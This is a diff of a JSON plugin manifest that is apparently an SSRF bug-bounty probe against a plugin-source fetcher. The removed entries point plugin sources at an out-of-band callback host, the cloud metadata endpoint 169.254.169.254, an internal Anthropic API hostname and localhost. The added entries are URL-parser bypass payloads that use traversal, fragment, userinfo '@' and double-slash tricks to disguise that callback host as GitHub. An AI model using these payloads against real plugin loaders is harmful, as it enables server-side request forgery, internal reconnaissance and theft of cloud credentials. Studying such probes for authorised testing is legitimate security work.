@@ -1,71 +1,51 @@
 {
-  "name": "ssrf-probe-058",
-  "description": "SSRF research probe — bug bounty by liamconner10",
+  "name": "ssrf-probe-058-v3",
+  "description": "valid + bypass attempts",
   "owner": {"name": "research", "email": "liamconner10@gmail.com"},
   "plugins": [
     {
-      "name": "ssrf-probe-https-oast",
-      "description": "https oast",
+      "name": "valid-plugin-self",
+      "description": "valid github source",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-https-oast-058"
+        "url": "https://github.com/LiamConner10/058-plugin-source"
       }
     },
     {
-      "name": "ssrf-probe-https-attacker",
-      "description": "arbitrary https hostname",
+      "name": "bypass-1-trailing-slash",
+      "description": "trailing slash",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://example.com/anything-058"
+        "url": "https://github.com/LiamConner10/058-plugin-source/../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me"
       }
     },
     {
-      "name": "ssrf-probe-https-imds",
-      "description": "imds https",
+      "name": "bypass-2-fragment",
+      "description": "fragment after host",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://169.254.169.254/latest/meta-data/"
+        "url": "https://github.com/LiamConner10/058-plugin-source#@d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
       }
     },
     {
-      "name": "ssrf-probe-https-internal-anth",
-      "description": "internal anthropic",
+      "name": "bypass-3-userinfo",
+      "description": "userinfo with at",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://internal.api.anthropic.com/whoami"
+        "url": "https://github.com@d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
       }
     },
     {
-      "name": "ssrf-probe-https-localhost",
-      "description": "localhost",
+      "name": "bypass-4-double-slash",
+      "description": "double slash",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://localhost/"
-      }
-    },
-    {
-      "name": "ssrf-probe-https-127",
-      "description": "127.0.0.1",
-      "category": "research",
-      "source": {
-        "source": "url",
-        "url": "https://127.0.0.1/"
-      }
-    },
-    {
-      "name": "ssrf-probe-git-https-oast",
-      "description": "git-subdir https oast",
-      "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/git-oast-058.git",
-        "path": "plugins/x",
-        "ref": "main"
+        "url": "https://github.com//d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
       }
     }
   ]
